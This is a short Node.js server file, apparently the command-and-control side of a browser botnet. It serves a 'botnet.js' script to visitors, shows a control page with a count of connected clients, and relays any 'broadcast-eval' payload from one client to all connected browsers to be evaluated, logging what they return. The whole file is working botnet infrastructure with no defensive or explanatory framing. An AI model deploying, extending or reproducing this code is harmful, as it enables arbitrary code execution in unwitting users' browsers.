var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var view = require('express-react-views').createEngine();

app.set('views', __dirname + '/views');
app.set('view engine', 'jsx');
app.engine('jsx', view);

app.get('/', function (req, res) {
   res.render('index', {});
});

app.get('/control', function (req, res) {
    /// Object.keys(socketIO.connected).length;
    res.render('control', {connection_count: io.sockets.sockets.length});
});

app.get('/botnetjs/botnet.js', function (req, res) {
    res.sendFile(__dirname + '/public/botnet.js');
});

app.get('/botnetjs/control.js', function (req, res) {
    res.sendFile(__dirname + '/public/control.js');
});

app.get('/status', function (req, res) {
    res.render('status', {});
});

http.listen(3000, function () {
    console.log('server started');
});

io.on('connection', function (socket) {
    console.log('a user connected: ' + socket.conn.remoteAddress);

    socket.on('client-eval-result', function(data) {
        console.info('client-eval-result: ' + data);
    });

    socket.on('broadcast-eval', function (data) {
        io.sockets.emit('eval', data);
        console.log('broadcast-eval: ' + data);
        console.log('from: ' + socket.conn.remoteAddress);
    });
});

